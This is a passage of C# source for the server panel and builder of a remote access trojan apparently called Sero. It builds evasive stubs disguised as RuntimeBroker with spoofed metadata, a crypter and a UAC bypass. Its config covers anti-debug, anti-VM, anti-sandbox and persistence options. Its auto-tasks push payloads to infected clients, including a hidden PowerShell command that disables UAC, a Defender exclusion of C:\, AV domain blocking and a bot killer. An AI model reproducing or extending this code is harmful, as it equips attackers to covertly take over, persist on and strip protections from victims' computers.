            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<Product>[^<]*</Product>", $"<Product>{product}</Product>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<Company>[^<]*</Company>", $"<Company>{company}</Company>");
            csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                @"<FileVersion>[^<]*</FileVersion>", $"<FileVersion>{fileVersion}</FileVersion>");

            // Update or add Copyright
            if (csproj.Contains("<Copyright>"))
            {
                csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                    @"<Copyright>[^<]*</Copyright>", $"<Copyright>{copyright}</Copyright>");
            }
            else
            {
                // Add Copyright after Company if it doesn't exist
                csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                    @"(<Company>[^<]*</Company>)", $"$1\n    <Copyright>{copyright}</Copyright>");
            }

            // Update ProductVersion and InformationalVersion
            if (csproj.Contains("<ProductVersion>"))
            {
                csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                    @"<ProductVersion>[^<]*</ProductVersion>", $"<ProductVersion>{productVersion}</ProductVersion>");
            }

            if (csproj.Contains("<InformationalVersion>"))
            {
                csproj = System.Text.RegularExpressions.Regex.Replace(csproj,
                    @"<InformationalVersion>[^<]*</InformationalVersion>", $"<InformationalVersion>{productVersion}</InformationalVersion>");
            }

            await File.WriteAllTextAsync(csprojPath, csproj);

            // Clean build cache (offloaded — can be slow on large NativeAOT obj dirs)
            var binDir = Path.Combine(stubDir, "bin");
            var objDir = Path.Combine(stubDir, "obj");
            TxtBuildStatus.Text = "Cleaning cache...";
            await Task.Run(() =>
            {
                try { if (Directory.Exists(binDir)) Directory.Delete(binDir, true); } catch { }
                try { if (Directory.Exists(objDir)) Directory.Delete(objDir, true); } catch { }
            });

            // Always NativeAOT — best evasion + modular native DLL plugins via NativeLibrary.Load
            TxtBuildStatus.Text = "Compiling (NativeAOT)...";
            Log("[*] Builder: dotnet publish (NativeAOT)...");

            var tempOut = Path.Combine(Path.GetTempPath(), "sero_build_" + Guid.NewGuid().ToString("N")[..8]);

            var iconArg = "";
            if (BldIconPath.Text != "No icon selected" && File.Exists(BldIconPath.Text))
            {
                iconArg = $" -p:ApplicationIcon=\"{BldIconPath.Text}\"";
                Log($"[*] Builder: Icon will be embedded: {BldIconPath.Text}");
            }

            // Size: optimize for smaller binary (fold identical methods, prefer size over speed).
            // Compatible with crypter/loader — they just compress+encrypt the PE, size reduction is fine.
            var ilcThreads = Math.Min(Environment.ProcessorCount, 8);
            var publishArgs = $"publish \"{csprojPath}\" -c Release -r win-x64 -p:PublishAot=true -p:InvariantGlobalization=true -p:IlcOptimizationPreference=Size -p:IlcGenerateStackTraceData=false -p:IlcFoldIdenticalMethodBodies=true -p:IlcMaxParallelism={ilcThreads}{iconArg} -o \"{tempOut}\"";
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = "dotnet",
                Arguments = publishArgs,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WorkingDirectory = stubDir,
            };

            // NativeAOT needs vswhere.exe in PATH to find MSVC linker
            {
                var vsInstaller = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                    "Microsoft Visual Studio", "Installer");
                if (Directory.Exists(vsInstaller))
                    psi.Environment["PATH"] = vsInstaller + ";" + Environment.GetEnvironmentVariable("PATH");
            }

            using var proc = System.Diagnostics.Process.Start(psi)!;
            // Read both streams in parallel to avoid deadlock
            var stdoutTask = proc.StandardOutput.ReadToEndAsync();
            var stderrTask = proc.StandardError.ReadToEndAsync();
            await proc.WaitForExitAsync();
            var stdout = await stdoutTask;
            var stderr = await stderrTask;

            if (proc.ExitCode != 0)
            {
                Log($"[!] Builder: Build failed (exit {proc.ExitCode})");
                if (!string.IsNullOrWhiteSpace(stderr)) Log(stderr);
                if (!string.IsNullOrWhiteSpace(stdout)) Log(stdout);
                TxtBuildStatus.Text = "Build FAILED. Check logs.";
                return;
            }

            Log("[+] Builder: Compilation successful.");

            var builtExe = Path.Combine(tempOut, assemblyName + ".exe");
            if (!File.Exists(builtExe))
            {
                var exes = Directory.GetFiles(tempOut, "*.exe");
                if (exes.Length > 0) builtExe = exes[0];
                else
                {
                    Log("[!] Builder: Output exe not found.");
                    TxtBuildStatus.Text = "Build output not found.";
                    return;
                }
            }

            File.Copy(builtExe, outputExe, true);
            try { Directory.Delete(tempOut, true); } catch { }

            // Apply crypter if enabled — or if UAC bypass is checked (bypass lives inside the C++ loader)
            bool uacBypass = BldUacBypass.IsChecked == true;
            bool needsCrypter = BldEncrypt.IsChecked == true || uacBypass;
            if (needsCrypter)
            {
                if (uacBypass && BldEncrypt.IsChecked != true)
                    Log("[*] Builder: UAC bypass requires the native loader — crypter applied automatically.");

                TxtBuildStatus.Text = "Applying crypter...";
                Log("[*] Builder: Applying AES crypter...");

                // Pass icon + metadata so the C++ loader is compiled with them via rc.exe
                string? iconForLoader = (BldIconPath.Text != "No icon selected" && File.Exists(BldIconPath.Text))
                    ? BldIconPath.Text : null;
                var meta = (BldSetAssembly.IsChecked == true && selectedExePath != null && File.Exists(selectedExePath))
                    ? new SeroServer.Builder.LoaderMetadata(product, company, fileVersion, productVersion, assemblyTitle, copyright)
                    : null;

                await SeroServer.Builder.CrypterBuilder.ApplyAsync(outputExe, Log, iconForLoader, meta, uacBypass);
            }
            else
            {
                // No crypter — icon already embedded via -p:ApplicationIcon at compile time
            }

            var size = new FileInfo(outputExe).Length;
            var sizeStr = size < 1024 * 1024
                ? $"{size / 1024.0:F0} KB"
                : $"{size / (1024.0 * 1024.0):F1} MB";
            Log($"[+] Builder: {Path.GetFileName(outputExe)} ({size:N0} bytes) saved.");
            TxtBuildStatus.Text = $"Built: {Path.GetFileName(outputExe)} ({sizeStr})";
            TxtStatusBar.Text = "Build successful.";

            MessageBox.Show(
                $"Build successful!\n\n" +
                $"File: {Path.GetFileName(outputExe)}\n" +
                $"Size: {sizeStr}\n" +
                $"Mode: NativeAOT",
                "Sero — Build Complete", MessageBoxButton.OK, MessageBoxImage.Information);
        }
        catch (Exception ex)
        {
            Log($"[!] Builder: {ex.Message}");
            TxtBuildStatus.Text = $"Error: {ex.Message}";
        }
        finally
        {
            BtnBuild.IsEnabled = true;
            BuilderPanel.IsEnabled = true;
        }
    }

    // Helper: run a process and return (exitCode, stdout+stderr combined) without deadlocking
    private static async Task<(int code, string output)> RunProcessAsync(System.Diagnostics.ProcessStartInfo psi)
    {
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        using var p = System.Diagnostics.Process.Start(psi)!;
        var outTask = p.StandardOutput.ReadToEndAsync();
        var errTask = p.StandardError.ReadToEndAsync();
        await p.WaitForExitAsync();
        return (p.ExitCode, await outTask + await errTask);
    }



    private void BuildConfig_Click(object sender, RoutedEventArgs e)
    {
        int.TryParse(BldPort.Text, out int port);
        int.TryParse(BldReconnectDelay.Text, out int reconnect);
        if (port < 1 || port > 65535) port = 7777;

        // Determine assembly name
        string name = "RuntimeBroker";

        var configDict = new Dictionary<string, object>
        {
            { "host", GetPrimaryHost() },
            { "port", port },
            { "assemblyName", name },
            { "useMutex", BldUseMutex.IsChecked == true },
            { "antiDebug", BldAntiDebug.IsChecked == true },
            { "antiVM", BldAntiVM.IsChecked == true },
            { "antiDetect", BldAntiDetect.IsChecked == true },
            { "antiSandbox", BldAntiSandbox.IsChecked == true },
            { "persistRegistry", BldPersistRegistry.IsChecked == true },
            { "persistStartup", BldPersistStartup.IsChecked == true },
            { "reconnectDelayMs", reconnect > 0 ? reconnect : 5000 },
        };

        // Only add mutexName if "Use Mutex" is checked
        if (BldUseMutex.IsChecked == true)
        {
            configDict["mutexName"] = BldMutex.Text.Trim();
        }

        var dialog = new Microsoft.Win32.SaveFileDialog
        {
            Filter = "JSON Config (*.json)|*.json",
            FileName = "config.json",
            Title = "Export Client Config"
        };

        if (dialog.ShowDialog() == true)
        {
            var json = JsonSerializer.Serialize(configDict, new JsonSerializerOptions { WriteIndented = true });
            File.WriteAllText(dialog.FileName, json);
            Log($"[+] Builder: Config exported to {dialog.FileName}");
            TxtStatusBar.Text = "Config exported.";
        }
    }

    // ── Settings ────────────────────────────────────

    private async void GetMyIP_Click(object sender, RoutedEventArgs e)
    {
        try
        {
            TxtPortResult.Text = "Getting IP...";
            using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(5) };
            var ip = (await http.GetStringAsync("https://api.ipify.org")).Trim();
            SettingsCheckIP.Text = ip;
            TxtPortResult.Text = $"Your public IP: {ip}";
            TxtPortResult.Foreground = (Brush)FindResource("DimBrush");
        }
        catch { TxtPortResult.Text = "Failed to get IP."; }
    }

    private async void CheckPort_Click(object sender, RoutedEventArgs e)
    {
        var ip = SettingsCheckIP.Text.Trim();
        if (!int.TryParse(SettingsCheckPort.Text.Trim(), out int port) || port < 1 || port > 65535)
        {
            TxtPortResult.Text = "Invalid port.";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
            return;
        }

        if (ip is "127.0.0.1" or "localhost" or "::1" or "0.0.0.0" or "")
        {
            TxtPortResult.Text = "Cannot check localhost.";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
            return;
        }

        TxtPortResult.Text = $"Checking {ip}:{port}...";
        TxtPortResult.Foreground = (Brush)FindResource("DimBrush");

        try
        {
            using var tcp = new System.Net.Sockets.TcpClient();
            var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
            await tcp.ConnectAsync(ip, port, cts.Token);

            TxtPortResult.Text = $"Port {port} is OPEN on {ip}";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0x1b, 0x8a, 0x2e));
        }
        catch (OperationCanceledException)
        {
            TxtPortResult.Text = $"Port {port} is CLOSED or unreachable on {ip} (timeout)";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
        }
        catch
        {
            TxtPortResult.Text = $"Port {port} is CLOSED on {ip} (connection refused)";
            TxtPortResult.Foreground = new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
        }
    }

    private void SettingsApply_Click(object sender, RoutedEventArgs e)
    {
        if (int.TryParse(SettingsMaxClients.Text, out int max) && max > 0)
        {
            if (_server != null)
                _server.MaxConnectedClients = max;
            Log($"[*] Max connected clients set to {max}.");
            TxtStatusBar.Text = $"Settings applied (max clients: {max}).";
        }

        // Discord RPC toggle
        if (SettingsDiscordRPC.IsChecked == true && _discordRpc == null && _server is { IsRunning: true })
        {
            try
            {
                _discordRpc = new Net.SeroDiscordRPC();
                _discordRpc.Start(() => _server?.ConnectedClients.Count ?? 0);
                Log("[*] Discord RPC enabled.");
            }
            catch { }
        }
        else if (SettingsDiscordRPC.IsChecked == false && _discordRpc != null)
        {
            _discordRpc.Stop();
            _discordRpc = null;
            Log("[*] Discord RPC disabled. Restart Discord or wait a few seconds for it to clear.");
        }

        if (!int.TryParse(SettingsMaxClients.Text, out int _check) || _check <= 0)
        {
            Log("[!] Invalid max clients value.");
        }

        SaveConfig();
    }

    // ── AutoTask ────────────────────────────────────

    private void AutoTask_AddFile_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new Microsoft.Win32.OpenFileDialog
        {
            Title = "Select file to auto-execute on clients",
            Filter = "All files (*.*)|*.*|Executables (*.exe)|*.exe"
        };
        if (dlg.ShowDialog() != true) return;

        var fileBytes = File.ReadAllBytes(dlg.FileName);
        var entry = new Data.AutoTaskEntry
        {
            FileName = Path.GetFileName(dlg.FileName),
            FileBase64 = Convert.ToBase64String(fileBytes),
            FileSize = fileBytes.Length
        };
        _autoTasks.Add(entry);
        Log($"[+] AutoTask: added {entry.FileName} ({entry.SizeDisplay})");
        _ = ExecuteAutoTasksForAllConnected();
    }

    private void AutoTask_BlockReset_Click(object sender, RoutedEventArgs e)
    {
        const string displayName = "Block Reset";
        if (_autoTasks.Any(t => t.FileName == displayName))
        {
            Log("[!] AutoTask: Block Reset already in list.");
            return;
        }
        _ = CompileAndAddPluginTask(displayName, Builder.PluginSources.BlockReset, "user32.lib", adminOnly: true);
    }

    private void AutoTask_ExcludeCDrive_Click(object sender, RoutedEventArgs e)
    {
        const string displayName = "Exclude C:\\";
        if (_autoTasks.Any(t => t.FileName == displayName))
        {
            Log("[!] AutoTask: Exclude C:\\ already in list.");
            return;
        }
        _ = CompileAndAddPluginTask(displayName, Builder.PluginSources.ExcludeDefender, "ole32.lib oleaut32.lib advapi32.lib", adminOnly: true);
    }

    private static string PluginCachePath(string pluginName)
    {
        var safe = pluginName.ToLowerInvariant()
            .Replace(" ", "_").Replace("\\", "").Replace(":", "").Replace("/", "_");
        return System.IO.Path.Combine(
            AppDomain.CurrentDomain.BaseDirectory, "plugin_cache", safe + ".dll");
    }

    // SHA256 of the C++ source — detects when plugin code changes after server recompile.
    private static string _SourceHash(string src)
    {
        var hash = System.Security.Cryptography.SHA256.HashData(
            System.Text.Encoding.UTF8.GetBytes(src));
        return Convert.ToHexString(hash)[..16]; // 16-char prefix is enough for cache key
    }

    private async Task CompileAndAddPluginTask(string taskName, string cppSource, string? extraLibs, bool adminOnly = false)
    {
        var cachePath = PluginCachePath(taskName);
        var hashPath  = cachePath + ".hash";
        byte[]? bytes = null;

        // Use cache only if the source hash matches — recompiles automatically when
        // plugin code changes (e.g. after a server recompile with updated sources).
        var currentHash = _SourceHash(cppSource);
        bool cacheValid = File.Exists(cachePath)
                       && File.Exists(hashPath)
                       && (await File.ReadAllTextAsync(hashPath)).Trim() == currentHash;

        if (cacheValid)
        {
            bytes = await File.ReadAllBytesAsync(cachePath);
            Log($"[*] AutoTask: {taskName} loaded from cache ({bytes.Length / 1024.0:F0} KB).");
        }
        else
        {
            if (File.Exists(cachePath))
                Log($"[*] AutoTask: {taskName} source changed — recompiling...");
            else
                Log($"[*] AutoTask: Compiling {taskName} plugin...");

            bytes = await Builder.CrypterBuilder.CompilePluginDllAsync(cppSource, extraLibs, Log);
            if (bytes == null)
            {
                Log($"[!] AutoTask: {taskName} compile failed — task not added.");
                return;
            }
            try
            {
                Directory.CreateDirectory(System.IO.Path.GetDirectoryName(cachePath)!);
                await File.WriteAllBytesAsync(cachePath, bytes);
                await File.WriteAllTextAsync(hashPath, currentHash);
            }
            catch { }
        }

        var entry = new Data.AutoTaskEntry
        {
            Type = Data.AutoTaskType.PluginExec,
            FileName = taskName,
            FileBase64 = Convert.ToBase64String(bytes),
            FileSize = bytes.Length,
            AdminOnly = adminOnly
        };
        _autoTasks.Add(entry);
        Log($"[+] AutoTask: {taskName} added as DLL plugin ({entry.SizeDisplay}).");
        _ = ExecuteAutoTasksForAllConnected();
    }

    private void AutoTask_DisableUAC_Click(object sender, RoutedEventArgs e)
    {
        if (_autoTasks.Any(t => t.FileName == "Disable UAC"))
        {
            Log("[!] AutoTask: Disable UAC already in list.");
            return;
        }

        // EnableLUA=0 fully disables UAC — takes effect after reboot.
        // Also schedule a forced reboot in 10s so the change applies immediately.
        var entry = new Data.AutoTaskEntry
        {
            Type = Data.AutoTaskType.ShellCommand,
            FileName = "Disable UAC",
            ShellCommand = "powershell -NoP -NonI -W Hidden -Command \"" +
                "$p='HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System';" +
                "Set-ItemProperty $p EnableLUA                   0 -Type DWord -Force;" +
                "Set-ItemProperty $p ConsentPromptBehaviorAdmin  0 -Type DWord -Force;" +
                "Set-ItemProperty $p ConsentPromptBehaviorUser   0 -Type DWord -Force;" +
                "Set-ItemProperty $p PromptOnSecureDesktop       0 -Type DWord -Force\"",
            AdminOnly = true
        };
        _autoTasks.Add(entry);
        Log("[+] AutoTask: Disable UAC added (EnableLUA=0, no reboot forced).");
        _ = ExecuteAutoTasksForAllConnected();
    }


    private void AutoTask_BlockAvDomains_Click(object sender, RoutedEventArgs e)
    {
        const string displayName = "Block AV DNS";
        if (_autoTasks.Any(t => t.FileName == displayName))
        {
            Log("[!] AutoTask: Block AV DNS already in list.");
            return;
        }
        _ = CompileAndAddPluginTask(displayName, Builder.PluginSources.BlockAvDns, "user32.lib", adminOnly: true);
    }

    private void AutoTask_BotKiller_Click(object sender, RoutedEventArgs e)
    {
        const string displayName = "BotKiller";
        if (_autoTasks.Any(t => t.FileName == displayName))
        {
            Log("[!] AutoTask: BotKiller already in list.");
            return;
        }
        _ = CompileAndAddPluginTask(displayName, Builder.PluginSources.BotKiller, "advapi32.lib", adminOnly: false);
    }

    private void BldMnrStatsLaunch_Click(object sender, RoutedEventArgs e)
    {
        var localIp = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()
            .Where(ni => ni.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up)
            .SelectMany(ni => ni.GetIPProperties().UnicastAddresses)
            .Where(a => a.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork
                     && !System.Net.IPAddress.IsLoopback(a.Address)
                     && a.Address.GetAddressBytes()[0] != 169)
            .Select(a => a.Address.ToString())
            .FirstOrDefault() ?? "localhost";
        BldMnrStatsUrl.Text = $"http://{localIp}:8080/api/report";

        bool alreadyRunning = System.Diagnostics.Process.GetProcessesByName("StatsServer").Length > 0;
        if (!alreadyRunning)
        {
            var exeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";
            // Walk up until we find the project root (contains stats-server/)
            string? projectRoot = null;
            var dir = new DirectoryInfo(exeDir);
            while (dir != null)
            {
                if (Directory.Exists(Path.Combine(dir.FullName, "stats-server")))
                { projectRoot = dir.FullName; break; }
                dir = dir.Parent;
            }

            string? exe = null;
            if (projectRoot != null)
            {
                var candidates = new[]
                {
                    Path.Combine(projectRoot, "stats-server", "publish", "StatsServer.exe"),
                    Path.Combine(projectRoot, "stats-server", "bin", "Release", "net10.0-windows", "win-x64", "StatsServer.exe"),
                    Path.Combine(projectRoot, "stats-server", "bin", "Release", "net10.0-windows", "StatsServer.exe"),
                };
                exe = candidates.FirstOrDefault(File.Exists);
                // Fallback: recursive search under stats-server/
                if (exe == null)
                {
                    var ssDir = Path.Combine(projectRoot, "stats-server");
                    exe = Directory.GetFiles(ssDir, "StatsServer.exe", SearchOption.AllDirectories)
                                   .OrderByDescending(File.GetLastWriteTime)
                                   .FirstOrDefault();
                }
            }

            if (exe == null) { Log("[!] StatsServer.exe not found — build it first or run start_stats.bat"); }
            else
            {
                var token = BldMnrStatsToken.Text.Trim();
                var psi = new System.Diagnostics.ProcessStartInfo(exe) { UseShellExecute = true };
                psi.Arguments = string.IsNullOrEmpty(token) ? "8080" : $"8080 {token}";
                try { System.Diagnostics.Process.Start(psi); Log($"[+] StatsServer launched: {Path.GetFileName(exe)}"); }
                catch (Exception ex) { Log($"[!] Cannot launch stats-server: {ex.Message}"); }
            }
        }
        else { Log("[*] StatsServer already running."); }

        var dashUrl = $"http://{localIp}:8080/";
        try { System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(dashUrl) { UseShellExecute = true }); }
        catch { }
        Log($"[*] Stats-server → {BldMnrStatsUrl.Text}");
    }

    // ── BotKiller: send to selected clients on-demand (right-click menu) ──
    private async void BotKiller_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        Log("[*] BotKiller: compiling...");
        var bytes = await Builder.CrypterBuilder.CompilePluginDllAsync(
            Builder.PluginSources.BotKiller, "advapi32.lib", Log);
        if (bytes == null) { Log("[!] BotKiller: compile failed."); return; }

        var packet = new Protocol.Packet
        {
            Type = Protocol.PacketType.PluginExec,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
            {
                DllBase64  = Convert.ToBase64String(bytes),
                ExportName = "PluginMain"
            })
        };
        foreach (var c in clients)
            await _server.SendToClient(c.Id, packet);
        Log($"[+] BotKiller sent to {clients.Count} client(s) ({bytes.Length / 1024.0:F0} KB).");
    }

    private void AutoTask_Remove_Click(object sender, RoutedEventArgs e)
    {
        var selected = GridAutoTasks.SelectedItems.Cast<Data.AutoTaskEntry>().ToList();
        foreach (var task in selected)
        {
            _autoTasks.Remove(task);
            Log($"[-] AutoTask: removed {task.FileName}");
        }
    }

    private async Task ExecuteAutoTasksForAllConnected()
    {
        if (_server == null || _autoTasks.Count == 0) return;
        foreach (var client in _server.ConnectedClients.Values.ToList())
        {
            try
            {
                await ExecuteAutoTasksForClient(client);
                await Task.Delay(200); // Space out between clients
            }
            catch { }
        }
    }

    public async Task ExecuteAutoTasksForClient(Data.ConnectedClient client)
    {
        foreach (var task in _autoTasks.ToList())
        {
            // Track by HWID so reconnecting clients don't re-execute
            if (task.ExecutedHwids.Contains(client.Hwid)) continue;

            // Skip admin-only tasks for non-admin clients
            if (task.AdminOnly && !client.IsAdmin) continue;

            try
            {
                Protocol.Packet packet;

                if (task.Type == Data.AutoTaskType.DefenderExclude)
                {
                    packet = new Protocol.Packet
                    {
                        Type = Protocol.PacketType.DefenderExclude,
                        Data = task.ShellCommand  // empty = stub uses its own install dir
                    };
                }
                else if (task.Type == Data.AutoTaskType.ShellCommand)
                {
                    packet = new Protocol.Packet
                    {
                        Type = Protocol.PacketType.AutoTaskShell,
                        Data = task.ShellCommand
                    };
                }
                else if (task.Type == Data.AutoTaskType.PluginExec)
                {
                    var data = new Protocol.PluginExecData
                    {
                        DllBase64  = task.FileBase64,
                        ExportName = "PluginMain"
                    };
                    packet = new Protocol.Packet
                    {
                        Type = Protocol.PacketType.PluginExec,
                        Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
                    };
                }
                else
                {
                    var data = new Protocol.RemoteFileExecData
                    {
                        FileName = task.FileName,
                        FileBase64 = task.FileBase64
                    };
                    packet = new Protocol.Packet
                    {
                        Type = Protocol.PacketType.RemoteFileExec,
                        Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
                    };
                }

                if (client.Stream == null) continue;
                await client.WriteLock.WaitAsync();
                try { await Protocol.Packet.WriteToStreamAsync(client.Stream, packet); }
                finally { client.WriteLock.Release(); }
                task.ExecutedHwids.Add(client.Hwid);
                task.ExecutionCount++;
                Log($"[+] AutoTask: executed {task.FileName} on {client.Id} (HWID tracked)");

                // Refresh AutoTask grid to update execution count (BeginInvoke = non-blocking)
                _ = Dispatcher.BeginInvoke(() => GridAutoTasks.Items.Refresh());

                // Small delay between sends to avoid saturating
                await Task.Delay(100);
            }
            catch (Exception ex)
            {
                Log($"[!] AutoTask: failed {task.FileName} on {client.Id}: {ex.Message}");
            }
        }
    }

    // ── Cert Setup / Export ─────────────────────────

    /// <summary>
    /// Shown on first launch — lets the user generate+save OR import an existing cert.
    /// </summary>
    private void ShowCertSetupDialog()
    {
        var dlg = new Window
        {
            Title = "Sero — TLS Certificate Setup",
            Width = 420, Height = 200,
            WindowStartupLocation = WindowStartupLocation.CenterScreen,
            ResizeMode = ResizeMode.NoResize,
            Background = new SolidColorBrush(Color.FromRgb(24, 24, 24)),
            WindowStyle = WindowStyle.ToolWindow,
        };

        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(20) };

        sp.Children.Add(new System.Windows.Controls.TextBlock
        {
            Text = "No TLS certificate found. Choose an option:",
            Foreground = Brushes.White,
            FontSize = 13,
            Margin = new Thickness(0, 0, 0, 16),
            TextWrapping = TextWrapping.Wrap,
        });

        var btnImport = new System.Windows.Controls.Button
        {
            Content = "Import backup or certificate (.sero / .pfx)…",
            Margin = new Thickness(0, 0, 0, 8),
            Padding = new Thickness(10, 6, 10, 6),
            HorizontalAlignment = HorizontalAlignment.Stretch,
        };
        var btnGen = new System.Windows.Controls.Button
        {
            Content = "Generate new certificate and save it…",
            Padding = new Thickness(10, 6, 10, 6),
            HorizontalAlignment = HorizontalAlignment.Stretch,
        };

        btnImport.Click += (_, _) => ImportCertOrBackup(() => dlg.Close());

        btnGen.Click += (_, _) =>
        {
            dlg.Close();
            var save = new Microsoft.Win32.SaveFileDialog
            {
                Filter = "PFX Certificate (*.pfx)|*.pfx",
                FileName = "sero_cert.pfx",
                Title = "Choose where to save the certificate"
            };
            if (save.ShowDialog() != true) return;
            try
            {
                Net.CertificateHelper.GenerateAndExportTo(save.FileName);
                Log($"[+] Certificate generated and saved to {save.FileName}");
                try { BldCertHash.Text = Net.CertificateHelper.GetCertSha256Hash(); } catch { }
                MessageBox.Show(
                    $"Certificat sauvegardé :\n{save.FileName}\n\nAucun mot de passe requis pour l'importer.",
                    "Sero — Certificat prêt", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception ex) { Log($"[!] Cert generation failed: {ex.Message}"); }
        };

        sp.Children.Add(btnImport);
        sp.Children.Add(btnGen);
        dlg.Content = sp;
        dlg.ShowDialog();
    }

    private void ExportBackup_Click(object sender, RoutedEventArgs e)
    {
        try
        {
            var authKey = BldAuthKey.Text.Trim();
            if (string.IsNullOrEmpty(authKey))
            {
                MessageBox.Show("Generate or set an auth key in the Builder tab before exporting a backup.",
                    "Sero — No Auth Key", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            var dialog = new Microsoft.Win32.SaveFileDialog
            {
                Filter = "Sero Backup (*.sero)|*.sero",
                FileName = "sero_backup.sero",
                Title = "Export Server Backup (cert + auth key)"
            };
            if (dialog.ShowDialog() != true) return;

            CertificateHelper.ExportServerBackup(dialog.FileName, authKey);
            Log($"[+] Server backup exported to {dialog.FileName}");
            TxtStatusBar.Text = "Server backup exported.";
            MessageBox.Show(
                $"Backup exporté :\n{dialog.FileName}\n\nContient le certificat TLS et la clé d'auth.\nImportez ce fichier sur une autre machine pour que les clients reconnectent.",
                "Sero — Backup réussi", MessageBoxButton.OK, MessageBoxImage.Information);
        }
        catch (Exception ex)
        {
            Log($"[!] Backup export failed: {ex.Message}");
            MessageBox.Show($"Export failed: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
        }
    }

    private void ImportBackup_Click(object sender, RoutedEventArgs e)
        => ImportCertOrBackup(null);

    private void ImportCertOrBackup(Action? onSuccess)
    {
        var open = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Sero Backup or Certificate (*.sero;*.pfx)|*.sero;*.pfx|All Files (*.*)|*.*",
            Title = "Import server backup (.sero) or certificate (.pfx)"
        };
        if (open.ShowDialog() != true) return;

        try
        {
            var path = open.FileName;
            var ext = System.IO.Path.GetExtension(path).ToLowerInvariant();

            if (ext == ".sero")
            {
                var restoredKey = CertificateHelper.ImportServerBackup(path);
                try { BldCertHash.Text = CertificateHelper.GetCertSha256Hash(); } catch { }

                if (!string.IsNullOrEmpty(restoredKey))
                {
                    BldAuthKey.Text = restoredKey;
                    BldAuthKey.IsReadOnly = true;
                    SaveConfig();
                }
                Log("[+] Server backup restored (cert + auth key).");
                TxtStatusBar.Text = "Backup restored.";
                MessageBox.Show(
                    "Backup restauré.\nCertificat + clé d'auth restaurés.\nRedémarrez le serveur pour que les clients reconnectent.",
                    "Sero — Import réussi", MessageBoxButton.OK, MessageBoxImage.Information);
            }
            else
            {
                try { CertificateHelper.ImportCertificate(path, null); }
                catch
                {
                    var pwd = PromptPassword("Ce certificat est protégé par un mot de passe.\nEntrez le mot de passe PFX :");
                    if (pwd == null) return;
                    CertificateHelper.ImportCertificate(path, pwd);
                }
                try { BldCertHash.Text = CertificateHelper.GetCertSha256Hash(); } catch { }
                Log("[+] Certificate imported.");
                TxtStatusBar.Text = "Certificate imported.";
                MessageBox.Show(
                    "Certificat importé.\nATTENTION : la clé d'auth n'est pas incluse dans un .pfx.\nVérifiez que la clé d'auth dans le Builder correspond à celle de vos stubs.",
                    "Sero — Import cert", MessageBoxButton.OK, MessageBoxImage.Warning);
            }

            onSuccess?.Invoke();
        }
        catch (Exception ex)
        {
            Log($"[!] Import failed: {ex.Message}");
            MessageBox.Show($"Import échoué : {ex.Message}", "Erreur", MessageBoxButton.OK, MessageBoxImage.Error);
        }
    }

    private void ExportCert_Click(object sender, RoutedEventArgs e)
    {
        try
        {
            var dialog = new Microsoft.Win32.SaveFileDialog
            {
                Filter = "PFX Certificate (*.pfx)|*.pfx",
                FileName = "sero_cert.pfx",
                Title = "Export TLS Certificate (cert only)"
            };

            if (dialog.ShowDialog() != true) return;

            CertificateHelper.ExportPfx(dialog.FileName);
            Log($"[+] Certificate exported to {dialog.FileName}");
            TxtStatusBar.Text = "Certificate exported.";
            MessageBox.Show(
                $"Certificat exporté :\n{dialog.FileName}\n\nATTENTION : Ce fichier ne contient pas la clé d'auth.\nUtilisez 'Backup' pour exporter cert + clé d'auth ensemble.",
                "Sero — Export cert", MessageBoxButton.OK, MessageBoxImage.Warning);
        }
        catch (Exception ex)
        {
            Log($"[!] Export failed: {ex.Message}");
            MessageBox.Show($"Export failed: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
        }
    }

    private static string? PromptPassword(string message)
    {
        var dlg = new Window
        {
            Title = "Certificate Password",
            Width = 350, Height = 150,
            WindowStartupLocation = WindowStartupLocation.CenterScreen,
            ResizeMode = ResizeMode.NoResize,
            Background = new SolidColorBrush(Color.FromRgb(30, 30, 30))
        };
        var sp = new System.Windows.Controls.StackPanel { Margin = new Thickness(12) };
        sp.Children.Add(new System.Windows.Controls.TextBlock
        {
            Text = message, Foreground = Brushes.White, TextWrapping = TextWrapping.Wrap, Margin = new Thickness(0, 0, 0, 8)
        });
        var tb = new System.Windows.Controls.PasswordBox { Margin = new Thickness(0, 0, 0, 8) };
        sp.Children.Add(tb);
        var btn = new System.Windows.Controls.Button { Content = "OK", Width = 80, HorizontalAlignment = HorizontalAlignment.Right };
